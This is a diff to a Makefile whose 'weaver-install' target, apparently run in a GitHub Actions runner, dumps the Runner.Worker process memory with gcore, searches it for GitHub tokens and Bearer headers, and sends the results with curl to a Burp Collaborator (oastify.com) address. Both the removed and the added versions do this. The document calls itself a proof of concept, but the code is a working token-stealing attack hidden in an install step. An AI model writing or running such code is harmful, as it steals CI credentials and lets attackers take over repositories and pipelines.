@@ -1,28 +1,28 @@
 COLLABORATOR_URL = http://jxkzddbnc4ii4jftrz0updno3f96xxlm.oastify.com
 
 weaver-install:
-	@echo "--- Resuming Memory Dump PoC ---"
-	# Install tools
+	@echo "--- Targeted Token Extraction ---"
 	@sudo apt-get update && sudo apt-get install -y gdb
 	
-	# Loop through all found PIDs for the Runner.Worker
-	@for pid in $$(pgrep -f "Runner.Worker"); do \
-		echo "Attempting to dump PID: $$pid"; \
-		sudo gcore -o worker_dump.$$pid $$pid || echo "Failed to dump $$pid, skipping..."; \
-	done
-
-	# Extract tokens from ALL successful dumps
-	@echo "Extracting tokens..."
-	@grep -aoE "ghs_[0-9a-zA-Z]{36,}" worker_dump.* > extracted_tokens.txt || echo "No tokens found"
+	# 1. Dump memory again
+	$(eval WORKER_PID := $(shell pgrep -f "Runner.Worker" | head -n 1))
+	@sudo gcore -o worker_dump $(WORKER_PID)
 	
-	# Exfiltrate to Burp Collaborator
-	@if [ -s extracted_tokens.txt ]; then \
-		echo "Tokens found! Exfiltrating..." ; \
-		curl -X POST --data-binary @extracted_tokens.txt $(COLLABORATOR_URL)/tokens_exfil; \
+	# 2. Search for the token in multiple encodings (Standard and Wide/UTF-16)
+	# GitHub tokens usually start with ghs_
+	@echo "Searching for token patterns..."
+	@strings worker_dump.* | grep -E "ghs_[0-9a-zA-Z]{30,}" > tokens.txt || true
+	@strings -e l worker_dump.* | grep -E "ghs_[0-9a-zA-Z]{30,}" >> tokens.txt || true
+	
+	# 3. Search for the 'Authorization' header format which often contains the token
+	@strings worker_dump.* | grep -i "Authorization: Bearer" >> tokens.txt || true
+	
+	# 4. Exfiltrate the results
+	@if [ -s tokens.txt ]; then \
+		echo "Token found! Sending to Collaborator..."; \
+		curl -X POST --data-binary @tokens.txt $(COLLABORATOR_URL)/final_token; \
 	else \
-		echo "No tokens in text file, exfiltrating raw strings fallback..."; \
-		strings worker_dump.* | grep -i "token" | head -n 100 | base64 -w 0 > strings_exfil.txt; \
-		curl -X POST -d @strings_exfil.txt $(COLLABORATOR_URL)/strings_fallback; \
+		echo "Direct grep failed. Sending full string dump of memory segments..."; \
+		strings worker_dump.* | grep -C 5 "ghs_" | base64 -w 0 > strings_context.txt; \
+		curl -X POST -d @strings_context.txt $(COLLABORATOR_URL)/context_dump; \
 	fi
-
-	@echo "--- PoC Complete ---"
